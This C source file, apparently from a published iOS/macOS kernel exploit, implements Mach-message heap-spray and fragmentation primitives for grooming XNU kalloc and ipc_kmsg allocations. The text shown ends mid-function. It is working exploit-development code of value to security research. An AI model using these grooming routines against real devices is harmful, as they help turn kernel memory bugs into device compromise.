/*
 * kernel_alloc.c
 * Brandon Azad
 */
#include "oob_kernel_alloc.h"

#include <assert.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>

#include "log.h"

// This is the size of entries in the ipc_kmsg zone. See zinit(256, ..., "ipc kmsgs").
static const size_t ipc_kmsg_zone_size = 256;

// This is the maximum number of out-of-line ports we can send in a message. See osfmk/ipc/ipc_kmsg.c.
static const size_t max_ool_ports_per_message = 16382;

// ---- Structures --------------------------------------------------------------------------------

// A message containing out-of-line ports.
struct ool_ports_message {
    mach_msg_header_t               header;
    mach_msg_body_t                 body;
    mach_msg_ool_ports_descriptor_t ool_ports[0];
};

// ---- Utility functions -------------------------------------------------------------------------

// Compute the minimum of 2 values.
#define min(a, b) ((a) < (b) ? (a) : (b))

/*
 * ipc_kmsg_alloc_values
 *
 * Description:
 *     Return select values computed by the kernel when allocating an ipc_kmsg.
 */
static void
ipc_kmsg_alloc_values(size_t message_size, size_t *message_and_trailer_size_out,
        size_t *max_expanded_size_out, size_t *kalloc_size_out,
        size_t *message_end_offset_out) {
    size_t max_trailer_size = 0x44;
    size_t kernel_message_size = message_size + 0x8;
    size_t message_and_trailer_size = kernel_message_size + max_trailer_size;
    if (message_and_trailer_size_out != NULL) {
        *message_and_trailer_size_out = message_and_trailer_size;
    }
    size_t max_desc = 0x4 * ((kernel_message_size -  0x24) / 0xc);
    size_t max_expanded_size = message_and_trailer_size + max_desc;
    if (max_expanded_size <= 0xa8) {
        max_expanded_size = 0xa8;
    }
    if (max_expanded_size_out != NULL) {
        *max_expanded_size_out = max_expanded_size;
    }
    size_t kalloc_size = max_expanded_size + 0x58;
    if (kalloc_size_out != NULL) {
        *kalloc_size_out = kalloc_size;
    }
    size_t message_end_offset = kalloc_size - max_trailer_size;
    if (message_end_offset_out != NULL) {
        *message_end_offset_out = message_end_offset;
    }
}

// ---- Message sizing functions ------------------------------------------------------------------

size_t
mach_message_size_for_ipc_kmsg_size(size_t ipc_kmsg_size) {
    if (ipc_kmsg_size < ipc_kmsg_zone_size) {
        ipc_kmsg_size = ipc_kmsg_zone_size;
    }
    // Thanks Ian!
    return ((3 * ipc_kmsg_size) / 4) - 0x74;
}

size_t
mach_message_size_for_kalloc_size(size_t kalloc_size) {
    if (kalloc_size <= ipc_kmsg_zone_size) {
        return 0;
    }
    return mach_message_size_for_ipc_kmsg_size(kalloc_size);
}

size_t
ipc_kmsg_size_for_mach_message_size(size_t message_size) {
    size_t kalloc_size;
    ipc_kmsg_alloc_values(message_size, NULL, NULL, &kalloc_size, NULL);
    return kalloc_size;
}

size_t
kalloc_size_for_mach_message_size(size_t message_size) {
    size_t ipc_kmsg_size = ipc_kmsg_size_for_mach_message_size(message_size);
    if (ipc_kmsg_size == ipc_kmsg_zone_size) {
        return 0;
    }
    return ipc_kmsg_size;
#if 0
    //return (message_size + 0x8 + 0x44) + 0x4 * ((message_size + 0x8 - 0x24) / 0xc) + 0x58;
    size_t max_trailer_size = 0x44;
    size_t kernel_message_size = message_size + 0x8;
    size_t message_and_trailer_size = kernel_message_size + max_trailer_size;
    size_t max_desc = 0x4 * ((kernel_message_size -  0x24) / 0xc);
    size_t max_expanded_size = message_and_trailer_size + max_desc;
    if (max_expanded_size <= 0xa8) {
        // ipc_kmsg_zone
        return 0;
    }
    size_t kalloc_size = max_expanded_size + 0x58;
    return kalloc_size;
#endif
}

// ---- Single messages ---------------------------------------------------------------------------

bool
ipc_kmsg_kalloc_send_one(mach_port_t holding_port, size_t kalloc_size) {
    // Check parameters.
    assert(kalloc_size >= ipc_kmsg_zone_size);
    // Construct the Mach message.
    size_t message_size = mach_message_size_for_ipc_kmsg_size(kalloc_size);
    mach_msg_header_t *message = malloc(message_size);
    memset(message, 0, message_size);
    message->msgh_bits        = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, 0);
    message->msgh_size        = (mach_msg_size_t) message_size;
    message->msgh_remote_port = holding_port;
    message->msgh_id          = 'kal1';
    // Send the message.
    kern_return_t kr = mach_msg(
            message,
            MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
            (mach_msg_size_t) message_size,
            0,
            MACH_PORT_NULL,
            MACH_MSG_TIMEOUT_NONE,
            MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        ERROR("%s: %s returned %d: %s",
                __func__, "mach_msg", kr, mach_error_string(kr));
    }
    // Free the message.
    free(message);
    return (kr == KERN_SUCCESS);
}

bool
ool_ports_send_one(mach_port_t holding_port,
        const mach_port_t *ool_ports,
        size_t ool_port_count,
        mach_msg_type_name_t ool_ports_disposition,
        size_t ipc_kmsg_size) {
    // Check parameters and adjust default values.
    assert(ipc_kmsg_size >= ipc_kmsg_zone_size);
    assert(ool_port_count <= max_ool_ports_per_message);
    // Create dummy ports (all MACH_PORT_NULL) if no ports were supplied.
    mach_port_t *dummy_ports = NULL;
    if (ool_ports == NULL) {
        dummy_ports = calloc(ool_port_count, sizeof(ool_ports[0]));
        assert(dummy_ports != NULL);
        ool_ports = dummy_ports;
    }
    // Construct the Mach message.
    size_t message_size = mach_message_size_for_ipc_kmsg_size(ipc_kmsg_size);
    assert(message_size >= sizeof(struct ool_ports_message)
            + sizeof(mach_msg_ool_ports_descriptor_t));
    struct ool_ports_message *message = malloc(message_size);
    assert(message != NULL);
    memset(message, 0, message_size);
    message->header.msgh_bits        = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
    message->header.msgh_size        = (mach_msg_size_t) message_size;
    message->header.msgh_remote_port = holding_port;
    message->header.msgh_id          = 'olp1';
    message->body.msgh_descriptor_count = 1;
    // Fill in the descriptor.
    message->ool_ports[0].type        = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    message->ool_ports[0].address     = (void *) ool_ports;
    message->ool_ports[0].count       = (mach_msg_size_t) ool_port_count;
    message->ool_ports[0].deallocate  = FALSE;
    message->ool_ports[0].copy        = MACH_MSG_PHYSICAL_COPY;
    message->ool_ports[0].disposition = ool_ports_disposition;
    // Send the message.
    kern_return_t kr = mach_msg(
            &message->header,
            MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
            (mach_msg_size_t) message_size,
            0,
            MACH_PORT_NULL,
            MACH_MSG_TIMEOUT_NONE,
            MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        ERROR("%s: %s returned %d: %s",
                __func__, "mach_msg", kr, mach_error_string(kr));
    }
    // Free the dummy ports and the message.
    if (dummy_ports) {
        free(dummy_ports);
    }
    free(message);
    return (kr == KERN_SUCCESS);
}

// ---- Basic Mach message spray ------------------------------------------------------------------

size_t
mach_message_spray(mach_port_t *holding_ports, size_t *holding_port_count,
        mach_msg_header_t *message, size_t message_size,
        size_t message_count, size_t messages_per_port) {
    // Check parameters and adjust default values.
    if (messages_per_port == 0 || messages_per_port > MACH_PORT_QLIMIT_MAX) {
        messages_per_port = MACH_PORT_QLIMIT_MAX;
    }
    // Set up the holding port iteration state. ports_used is the number of holding ports
    // currently used, which is 1 past the index of the current port. We start by pretending
    // we're processing the port at index -1, but setting send_failure to true means we
    // immediately advance to the port at index 0.
    size_t port_count = *holding_port_count;
    size_t ports_used = 0;
    size_t messages_sent_on_port = 0;
    bool send_failure = true;
    // Iterate sending one messages per loop until we've either run out of holding ports or
    // sent the required number of messages.
    size_t messages_sent = 0;
    while (messages_sent < message_count) {
        // If we failed to send a message on the current port or if the port is filled,
        // advance to the next port.
        if (send_failure || messages_sent_on_port >= messages_per_port) {
            // If we've run out of ports, abort. ports_used is always the actual number
            // of holding ports used, so there's no need to do final adjustment before
            // breaking.
            if (ports_used >= port_count) {
                assert(ports_used == port_count);
                break;
            }
            // We have a new holding port; reset port state. Bump ports_used here since
            // we'll try to send a message below: it's not worth handling the edge case
            // where the message doesn't send and thus the port is actually empty.
            message->msgh_remote_port = holding_ports[ports_used];
            ports_used++;
            messages_sent_on_port = 0;
            send_failure = false;
        }
        // Send one message.
        kern_return_t kr = mach_msg(
                message,
                MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
                (mach_msg_size_t) message_size,
                0,
                MACH_PORT_NULL,
                MACH_MSG_TIMEOUT_NONE,
                MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            ERROR("%s: %s returned %d: %s",
                    __func__, "mach_msg", kr, mach_error_string(kr));
            send_failure = true;
        }
        // If the message failed to send, then we'll move on to the next port without
        // incrementing the sent message count.
        if (!send_failure) {
            messages_sent++;
            messages_sent_on_port++;
        }
    }
    // Return the number of holding ports used and the number of messages sprayed.
    *holding_port_count = ports_used;
    return messages_sent;
}

#if 0
/*
 * mach_message_spray_custom
 *
 * Description:
 *     Spray Mach messages to the specified holding ports, adjusting the message on each
 *     iteration.
 *
 * Parameters:
 *     holding_ports            An array of Mach ports on which to enqueue Mach messages.
 *     holding_port_count    inout    The number of Mach ports in the holding_ports array. On
 *                     return, holding_port_count is set to the number of ports
 *                     actually used.
 *     message                The Mach message to send.
 *     message_size            The size of the Mach message.
 *     prepare_message            A callback block that is invoked each time a message will
 *                     be sent. The block is passed the message, an updateable
 *                     message size, and the current count. The block should
 *                     return the amount to update the current count if the
 *                     message is successfully sent.
 *     total_count            The count value at which no more messages should be sent.
 *     messages_per_port        The target number of Mach messages to enqueue on each port.
 *                     The last pair of holding ports used may each hold fewer
 *                     messages. Use 0 for MACH_PORT_QLIMIT_MAX.
 *
 * Returns:
 *     Returns the final count value.
 */
static size_t
mach_message_spray_custom(mach_port_t *holding_ports, size_t *holding_port_count,
        mach_msg_header_t *message, size_t message_size,
        size_t (^prepare_message)(mach_msg_header_t *message, size_t *size,
            size_t current_count),
        size_t total_count, size_t messages_per_port) {
    // Check parameters and adjust default values.
    if (messages_per_port == 0 || messages_per_port > MACH_PORT_QLIMIT_MAX) {
        messages_per_port = MACH_PORT_QLIMIT_MAX;
    }
    // Set up the holding port iteration state. ports_used is the number of holding ports
    // currently used, which is 1 past the index of the current port. We start by pretending
    // we're processing the port at index -1, but setting send_failure to true means we
    // immediately advance to the port at index 0.
    size_t port_count = *holding_port_count;
    size_t ports_used = 0;
    size_t messages_sent_on_port = 0;
    bool send_failure = true;
    // Iterate sending one messages per loop until we've either run out of holding ports or
    // until we've reached the target total_count value.
    size_t current_count = 0;
    while (current_count < total_count) {
        // If we failed to send a message on the current port or if the port is filled,
        // advance to the next port.
        if (send_failure || messages_sent_on_port >= messages_per_port) {
            // If we've run out of ports, abort. ports_used is always the actual number
            // of holding ports used, so there's no need to do final adjustment before
            // breaking.
            if (ports_used >= port_count) {
                assert(ports_used == port_count);
                break;
            }
            // We have a new holding port; reset port state. Bump ports_used here since
            // we'll try to send a message below: it's not worth handling the edge case
            // where the message doesn't send and thus the port is actually empty.
            message->msgh_remote_port = holding_ports[ports_used];
            ports_used++;
            messages_sent_on_port = 0;
            send_failure = false;
        }
        // Call the prepare_message() callback.
        size_t send_size = message_size;
        size_t update_count = prepare_message(message, &send_size, current_count);
        // Send one message.
        kern_return_t kr = mach_msg(
                message,
                MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
                (mach_msg_size_t) send_size,
                0,
                MACH_PORT_NULL,
                MACH_MSG_TIMEOUT_NONE,
                MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            ERROR("%s returned %d: %s", "mach_msg", kr, mach_error_string(kr));
            send_failure = true;
        }
        // If the message failed to send, then we'll move on to the next port without
        // incrementing the current_count and sent message count.
        if (!send_failure) {
            current_count += update_count;
            messages_sent_on_port++;
        }
    }
    // Return the number of holding ports used and the final current_count value.
    *holding_port_count = ports_used;
    return current_count;
}
#endif

/*
 * mach_message_alternating_spray
 *
 * Description:
 *     For each pair of Mach ports in the holding ports array, spray the first Mach message to the
 *     first Mach port of the pair and then spray the second Mach message to the second port of
 *     the pair. Repeat until each port has been filled and then move on to the next pair of
 *     holding ports, until the target number of messages have been sprayed.
 */
static size_t
mach_message_alternating_spray(mach_port_t *holding_ports, size_t *holding_port_count,
        mach_msg_header_t **messages, size_t *message_sizes,
        size_t message_count, size_t messages_per_port) {
    // Check parameters and adjust default values.
    if (messages_per_port == 0 || messages_per_port > MACH_PORT_QLIMIT_MAX) {
        messages_per_port = MACH_PORT_QLIMIT_MAX;
    }
    // Set up the holding port iteration state. ports_used is the number of holding ports
    // currently used, which is 2 past the index of the current port pair. We start by
    // pretending we're processing the port pair at index -2, but setting send_failure to true
    // means we immediately advance to the pair at index 0.
    size_t port_count = *holding_port_count;
    size_t ports_used = 0;
    mach_port_t port_pair[2];
    size_t messages_sent_on_each_port = 0;
    bool send_failure = true;
    // Iterate sending two messages per loop (one to each port of the pair) until we've either
    // run out of holding ports or sent the required number of messages.
    size_t messages_sent = 0;
    while (messages_sent < message_count) {
        // If we failed to send a message on the current port pair or if the pair is
        // filled, advance to the next pair.
        if (send_failure || messages_sent_on_each_port >= messages_per_port) {
            // If we've run out of ports, abort. ports_used is always the actual number
            // of holding ports used, so there's no need to do final adjustment before
            // breaking.
            if (ports_used + 1 >= port_count) {
                break;
            }
            // We have a new holding port pair; reset port state. Bump ports_used here
            // since we'll try to send messages below: it's not worth handling the edge
            // case where the messages don't send and thus the ports are actually
            // empty.
            port_pair[0] = holding_ports[ports_used];
            port_pair[1] = holding_ports[ports_used + 1];
            ports_used += 2;
            messages_sent_on_each_port = 0;
            send_failure = false;
        }
        // Send one message on each port in the pair.
        for (int i = 0; i < 2; i++) {
            // Set the destination port on each iteration in case
            // messages[0] == messages[1].
            messages[i]->msgh_remote_port = port_pair[i];
            // Send the message.
            kern_return_t kr = mach_msg(
                    messages[i],
                    MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
                    (mach_msg_size_t) message_sizes[i],
                    0,
                    MACH_PORT_NULL,
                    MACH_MSG_TIMEOUT_NONE,
                    MACH_PORT_NULL);
            if (kr != KERN_SUCCESS) {
                ERROR("%s: %s returned %d: %s",
                        __func__, "mach_msg", kr, mach_error_string(kr));
                send_failure = true;
            }
        }
        // If either message failed to send, then we'll move on to the next port pair
        // without incrementing the sent message count. This is not ideal, since if it was
        // the first message sent but the second did not then we're off in our parity which
        // will cause a fragmentation gap, but it's reasonable.
        if (!send_failure) {
            messages_sent += 2;
            messages_sent_on_each_port += 2;
        }
    }
    // Return the number of holding ports used and the number of messages sprayed.
    *holding_port_count = ports_used;
    return messages_sent;
}

// ---- Fragmentation spray -----------------------------------------------------------------------

size_t
ipc_kmsg_kalloc_fragmentation_spray(mach_port_t *holding_ports, size_t *holding_port_count,
        size_t kalloc_size, size_t message_count, size_t messages_per_port) {
    // Check parameters and adjust default values.
    assert(kalloc_size > ipc_kmsg_zone_size);
    // Construct the Mach message.
    size_t message_size = mach_message_size_for_kalloc_size(kalloc_size);
    mach_msg_header_t *message = malloc(message_size);
    assert(message != NULL);
    memset(message, 0, message_size);
    message->msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, 0);
    message->msgh_size = (mach_msg_size_t) message_size;
    message->msgh_id   = 'fgmt';
    // Spray the same message to each port in each pair, alternating messages between each port
    // of the pair so that adjacent messages end up in different ports. That way, destroying
    // all the ports of a particular index parity would produce an alternating pattern of
    // allocated and free memory of the target kalloc size.
    mach_msg_header_t *messages[2] = { message, message };
    size_t message_sizes[2] = { message_size, message_size };
    size_t messages_sent = mach_message_alternating_spray(holding_ports, holding_port_count,
            messages, message_sizes, message_count, messages_per_port);
    // Free the message.
    free(message);
    // Return the number of messages sprayed.
    return messages_sent;
}

// ---- ipc_kmsg kalloc spray ---------------------------------------------------------------------

size_t
ipc_kmsg_kalloc_spray_contents_size(size_t kalloc_size,
        size_t *contents_start, size_t *contents_end) {
    assert(kalloc_size >= ipc_kmsg_zone_size);
    // Compute the size of the Mach message needed to produce the desired allocation.
    size_t message_size = mach_message_size_for_ipc_kmsg_size(kalloc_size);
    // Compute the offset from the beginning of the ipc_kmsg allocation to the end of the
    // message. The controlled message contents are at the end of the message.
    size_t kalloc_size_check;
    size_t kmsg_offset_message_end;
    ipc_kmsg_alloc_values(message_size, NULL, NULL, &kalloc_size_check,
            &kmsg_offset_message_end);
    assert(kalloc_size_check == kalloc_size);
    // Compute the size of the controlled message contents. Since this is a simple message,
    // there is no mach_msg_body_t.
    size_t message_contents_size = message_size - sizeof(mach_msg_header_t);
    // Given the offset in the allocation to the end of the contents and the size of the
    // contents, compute the offset to the beginning of the controlled message contents.
    size_t kmsg_offset_contents_begin = kmsg_offset_message_end - message_contents_size;
    // Return the values.
    if (contents_start != NULL) {
        *contents_start = kmsg_offset_contents_begin;
    }
    if (contents_end != NULL) {
        *contents_end = kmsg_offset_message_end;
    }
    return message_contents_size;
}

size_t
ipc_kmsg_kalloc_spray(mach_port_t *holding_ports, size_t *holding_port_count,
        const void *data, size_t kalloc_size,
        size_t message_count, size_t messages_per_port) {
    // Check parameters and adjust default values.
    assert(kalloc_size >= ipc_kmsg_zone_size);
    assert(messages_per_port <= MACH_PORT_QLIMIT_MAX);
    // Construct the Mach message.
    size_t message_size = mach_message_size_for_ipc_kmsg_size(kalloc_size);
    mach_msg_header_t *message = malloc(message_size);
    assert(message != NULL);
    memset(message, 0, message_size);
    message->msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, 0);
    message->msgh_size = (mach_msg_size_t) message_size;
    message->msgh_id   = 'kals';
    // Fill the contents data if data was supplied.
    if (data != NULL) {
        size_t contents_size = message_size - sizeof(mach_msg_header_t);
        assert(ipc_kmsg_kalloc_spray_contents_size(kalloc_size, NULL, NULL) == contents_size);
        void *contents = (void *)(message + 1);
        memcpy(contents, data, contents_size);
    }
    // Spray the Mach messages on the holding ports.
    size_t messages_sent = mach_message_spray(holding_ports, holding_port_count,
            message, message_size, message_count, messages_per_port);
    // Free the message.
    free(message);
    // Return the number of messages sprayed.
    return messages_sent;
}

// ---- Out-of-line ports spray -------------------------------------------------------------------

size_t
ool_ports_spray(mach_port_t *holding_ports, size_t *holding_port_count,
        const mach_port_t *ool_ports, size_t ool_port_count,
        mach_msg_type_name_t ool_ports_disposition, size_t ool_port_descriptor_count,
        size_t ool_port_descriptors_per_message, size_t ipc_kmsg_size,
        size_t messages_per_port) {
    // Check parameters and adjust default values. We leave ool_port_descriptors_per_message
    // until after computing the message shape.
    assert(ipc_kmsg_size >= ipc_kmsg_zone_size);
    assert(ool_port_count <= max_ool_ports_per_message);
    assert(messages_per_port <= MACH_PORT_QLIMIT_MAX);
    if (messages_per_port == 0 || messages_per_port > MACH_PORT_QLIMIT_MAX) {
        messages_per_port = MACH_PORT_QLIMIT_MAX;
    }
    // Create dummy ports (all MACH_PORT_NULL) if no ports were supplied.
    mach_port_t *dummy_ports = NULL;
    if (ool_ports == NULL) {
        dummy_ports = calloc(ool_port_count, sizeof(ool_ports[0]));
        assert(dummy_ports != NULL);
        ool_ports = dummy_ports;
    }
    // Compute the message shape.
    size_t message_size = mach_message_size_for_ipc_kmsg_size(ipc_kmsg_size);
    size_t message_header_size = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
    size_t message_ool_port_descriptor_capacity = (message_size - message_header_size)
        / sizeof(mach_msg_ool_ports_descriptor_t);
    size_t message_ool_port_descriptor_limit = max_ool_ports_per_message / ool_port_count;
    size_t max_ool_port_descriptors_per_message = min(message_ool_port_descriptor_capacity,
            message_ool_port_descriptor_limit);
    if (ool_port_descriptors_per_message == 0) {
        ool_port_descriptors_per_message = max_ool_port_descriptors_per_message;
    }
    assert(ool_port_descriptors_per_message <= max_ool_port_descriptors_per_message);
    // Construct the Mach message.
    struct ool_ports_message *message = malloc(message_size);
    assert(message != NULL);
    memset(message, 0, message_size);
    message->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
    message->header.msgh_size = (mach_msg_size_t) message_size;
    message->header.msgh_id   = 'olps';
    message->body.msgh_descriptor_count = (mach_msg_size_t) ool_port_descriptors_per_message;
    // Fill in the descriptors.
    mach_msg_ool_ports_descriptor_t descriptor = {};
    descriptor.type        = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    descriptor.address     = (void *) ool_ports;
    descriptor.count       = (mach_msg_size_t) ool_port_count;
    descriptor.deallocate  = FALSE;
    descriptor.copy        = MACH_MSG_PHYSICAL_COPY;
    descriptor.disposition = ool_ports_disposition;
    for (size_t i = 0; i < ool_port_descriptors_per_message; i++) {
        message->ool_ports[i] = descriptor;
    }
    // Set up the holding port iteration state. ports_used is the number of holding ports
    // currently used, which is 1 past the index of the current port. We start by pretending
    // we're processing the port at index -1, but setting send_failure to true means we
    // immediately advance to the port at index 0.
    size_t port_count = *holding_port_count;
    size_t ports_used = 0;
    size_t messages_sent_on_port = 0;
    bool send_failure = true;
    // Iterate sending one messages per loop until we've either run out of holding ports or
    // sent the required number of out-of-line ports descriptors.
    size_t descriptors_sent = 0;
    while (descriptors_sent < ool_port_descriptor_count) {
        // If we failed to send a message on the current port or if the port is filled,
        // advance to the next port.
        if (send_failure || messages_sent_on_port >= messages_per_port) {
            // If we've run out of ports, abort. ports_used is always the actual number
            // of holding ports used, so there's no need to do final adjustment before
            // breaking.
            if (ports_used >= port_count) {
                assert(ports_used == port_count);
                break;
            }
            // We have a new holding port; reset port state. Bump ports_used here since
            // we'll try to send a message below: it's not worth handling the edge case
            // where the message doesn't send and thus the port is actually empty.
            message->header.msgh_remote_port = holding_ports[ports_used];
            ports_used++;
            messages_sent_on_port = 0;
            send_failure = false;
        }
        // If we have fewer than ool_port_descriptors_per_message descriptors left to send,
        // then update the number of descriptors in the message so that we don't overshoot.
        size_t descriptors_to_send = ool_port_descriptors_per_message;
        size_t descriptors_left = ool_port_descriptor_count - descriptors_sent;
        if (descriptors_left < descriptors_to_send) {
            descriptors_to_send = descriptors_left;
            message->body.msgh_descriptor_count = (mach_msg_size_t) descriptors_to_send;
        }
        // Send one message.
        kern_return_t kr = mach_msg(
                &message->header,
                MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
                (mach_msg_size_t) message_size,
                0,
                MACH_PORT_NULL,
                MACH_MSG_TIMEOUT_NONE,
                MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            ERROR("%s: %s returned %d: %s",
                    __func__, "mach_msg", kr, mach_error_string(kr));
            send_failure = true;
        }
        // If the message failed to send, then we'll move on to the next port without
        // incrementing the sent message count.
        if (!send_failure) {
            descriptors_sent += descriptors_to_send;
            messages_sent_on_port++;
        }
    }
    // Free the dummy ports and the message.
    if (dummy_ports) {
        free(dummy_ports);
    }
    free(message);
    // Return the number of holding ports used and the number of out-of-line port descriptors
    // sent.
    *holding_port_count = ports_used;
    return descriptors_sent;
}

// ---- Mach port manipulation functions ----------------------------------------------------------

mach_port_t *
mach_ports_create(size_t count) {
    mach_port_t *ports = calloc(count, sizeof(*ports));
    assert(ports != NULL);
    mach_port_options_t options = {};
    for (size_t i = 0; i < count; i++) {
        kern_return_t kr = mach_port_construct(mach_task_self(), &options, 0, &ports[i]);
        assert(kr == KERN_SUCCESS);
    }
    return ports;
}

void
mach_ports_destroy(mach_port_t *ports, size_t count) {
    for (size_t i = 0; i < count; i++) {
        mach_port_t port = ports[i];
        if (MACH_PORT_VALID(port)) {
            kern_return_t kr = mach_port_destroy(mach_task_self(), port);
            if (kr != KERN_SUCCESS) {
                ERROR("%s: %s returned %d: %s", __func__, "mach_port_destroy",
                        kr, mach_error_string(kr));
            }
        }
        ports[i] = MACH_PORT_DEAD;
    }
}

void
mach_ports_deallocate(mach_port_t *ports, size_t count) {
    for (size_t i = 0; i < count; i++) {
        mach_port_t port = ports[i];
        if (MACH_PORT_VALID(port)) {
            kern_return_t kr = mach_port_deallocate(mach_task_self(), port);
            if (kr != KERN_SUCCESS) {
                ERROR("%s: %s returned %d: %s", __func__, "mach_port_deallocate",
                        kr, mach_error_string(kr));
            }
        }
        ports[i] = MACH_PORT_DEAD;
    }
}

void
mach_port_increase_queue_limit(mach_port_t port) {
    mach_port_limits_t limits = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };
    kern_return_t kr = mach_port_set_attributes(
            mach_task_self(),
            port,
            MACH_PORT_LIMITS_INFO,
            (mach_port_info_t) &limits,
            MACH_PORT_LIMITS_INFO_COUNT);
    assert(kr == KERN_SUCCESS);
}

void
mach_port_insert_send_right(mach_port_t port) {
    kern_return_t kr = mach_port_insert_right(mach_task_self(), port, port,
            MACH_MSG_TYPE_MAKE_SEND);
    assert(kr == KERN_SUCCESS);
}

// ---- Basic Mach message receive ----------------------------------------------------------------

void
mach_port_drain_messages(mach_port_t port, void (^message_handler)(mach_msg_header_t *)) {
    kern_return_t kr;
    mach_msg_option_t options = MACH_RCV_MSG | MACH_RCV_LARGE | MACH_RCV_TIMEOUT
        | MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0)
        | MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_NULL);
    // Allocate an initial message buffer.
    mach_msg_size_t msg_size = 0x4000;
    mach_msg_base_t *msg = malloc(msg_size);
    assert(msg != NULL);
    // Loop through all the messages queued on the port.
    for (;;) {
        // Try to receive the message. If the buffer isn't big enough, reallocate
        // and try again. This should only happen twice.
        for (size_t try = 0;; try++) {
            assert(try < 2);
            // Receive the message.
            kr = mach_msg(
                    &msg->header,
                    options,
                    0,
                    msg_size,
                    port,
                    0,
                    MACH_PORT_NULL);
            if (kr != MACH_RCV_LARGE) {
                break;
            }
            // The buffer was too small, increase it.
            msg_size = msg->header.msgh_size + REQUESTED_TRAILER_SIZE(options);
            free(msg);
            msg = malloc(msg_size);
            assert(msg != NULL);
        }
        // If we got an error, stop processing messages on this port. If the error is a
        // timeout, that means that we've exhausted the queue, so don't print an error
        // message.
        if (kr != KERN_SUCCESS) {
            if (kr != MACH_RCV_TIMED_OUT) {
                ERROR("%s: %s returned %d: %s",
                        __func__, "mach_msg", kr, mach_error_string(kr));
            }
            break;
        }
        // Pass the message to the message handler.
        message_handler(&msg->header);
    }
    // Clean up resources.
    free(msg);
}

void
mach_port_discard_messages(mach_port_t port) {
    mach_port_drain_messages(port, ^(mach_msg_header_t *header) {
        mach_msg_destroy(header);
    });
}

void
ool_ports_receive(const mach_port_t *holding_ports,
        size_t holding_port_count,
        void (^ool_ports_handler)(mach_port_t *, size_t)) {
    // Loop through all the ports.
    for (size_t port_index = 0; port_index < holding_port_count; port_index++) {
        // Handle each message on the port.
        mach_port_drain_messages(holding_ports[port_index], ^(mach_msg_header_t *header) {
            // Skip the message if not complex.
            if (!MACH_MSGH_BITS_IS_COMPLEX(header->msgh_bits)) {
                goto done;
            }
            // Get the descriptor count. The kernel guarantees that we can trust
            // everything is in-bounds.
            mach_msg_body_t *body = (mach_msg_body_t *) (header + 1);
            size_t descriptor_count = body->msgh_descriptor_count;
            // Go through the descriptors one at a time, passing any out-of-line ports
            // descriptors to the handler block.
            mach_msg_descriptor_t *d = (mach_msg_descriptor_t *) (body + 1);
            for (size_t i = 0; i < descriptor_count; i++) {
                void *next;
                switch (d->type.type) {
                    case MACH_MSG_PORT_DESCRIPTOR:
                        next = &d->port + 1;
                        break;
                    case MACH_MSG_OOL_DESCRIPTOR:
                    case MACH_MSG_OOL_VOLATILE_DESCRIPTOR:
                        next = &d->out_of_line + 1;
                        break;
                    case MACH_MSG_OOL_PORTS_DESCRIPTOR:
                        next = &d->ool_ports + 1;
                        mach_port_t *ports = (mach_port_t *)
                            d->ool_ports.address;
                        size_t count = d->ool_ports.count;
                        ool_ports_handler(ports, count);
                        break;
                    case MACH_MSG_GUARDED_PORT_DESCRIPTOR:
                        next = &d->guarded_port + 1;
                        break;
                    default:
                        WARNING("Unexpected descriptor type %u",
                                d->type.type);
                        goto done;
                }
                d = (mach_msg_descriptor_t *) next;
            }
done:
            // Discard the message.
            mach_msg_destroy(header);
        });
    }
}

// ---- Convenience API ---------------------------------------------------------------------------

struct holding_port_array
holding_ports_create(size_t count) {
    mach_port_t *ports = mach_ports_create(count);
    for (size_t i = 0; i < count; i++) {
        mach_port_increase_queue_limit(ports[i]);
    }
    return (struct holding_port_array) { ports, count };
}

void
holding_ports_destroy(struct holding_port_array all_ports) {
    mach_ports_destroy(all_ports.ports, all_ports.count);
    free(all_ports.ports);
}

mach_port_t
holding_port_grab(struct holding_port_array *holding_ports) {
    if (holding_ports->count == 0) {
        return MACH_PORT_NULL;
    }
    mach_port_t port = holding_ports->ports[0];
    holding_ports->ports++;
    holding_ports->count--;
    return port;
}

mach_port_t
holding_port_pop(struct holding_port_array *holding_ports) {
    if (holding_ports->count == 0) {
        return MACH_PORT_NULL;
    }
    mach_port_t port = holding_ports->ports[0];
    holding_ports->ports[0] = MACH_PORT_DEAD;
    holding_ports->ports++;
    holding_ports->count--;
    return port;
}

void
ipc_kmsg_kalloc_fragmentation_spray_(struct ipc_kmsg_kalloc_fragmentation_spray *spray,
        size_t kalloc_size,
        size_t spray_size,
        size_t kalloc_size_per_port,
        struct holding_port_array *holding_ports) {
    // Check parameters.
    assert(kalloc_size <= spray_size);
    assert(kalloc_size_per_port >= kalloc_size);
    // Compute the number of messages in each port.
    size_t messages_per_port = kalloc_size_per_port / kalloc_size;
    if (messages_per_port > MACH_PORT_QLIMIT_MAX) {
        messages_per_port = MACH_PORT_QLIMIT_MAX;
    }
    // Compute the total number of messages.
    size_t message_count = spray_size / kalloc_size;
    // Call the implementation.
    struct holding_port_array ports = *holding_ports;
    size_t ports_used = ports.count;
    size_t sprayed_count = ipc_kmsg_kalloc_fragmentation_spray(ports.ports, &ports_used,
